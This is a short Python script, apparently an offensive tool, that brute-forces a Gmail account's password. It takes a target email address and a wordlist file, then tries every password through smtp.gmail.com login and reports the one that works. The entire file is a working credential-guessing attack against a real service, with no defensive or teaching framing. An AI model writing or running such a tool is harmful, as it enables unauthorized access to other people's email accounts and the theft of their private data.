#!/usr/bin/python3

import smtplib
from termcolor import colored

server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

usr = input("[*] Enter the email address of the target: ")
passFile = input("[*] Enter the full path of the password list: ")
file = open(passFile, "r")

for pwd in file:
	pwd = pwd.strip()
	try:
		server.login(usr, pwd)
		print(colored("[+] Password found : " + pwd, "green"))
		break
	except:
		print(colored("[-] Wrong password : " + pwd, "red"))
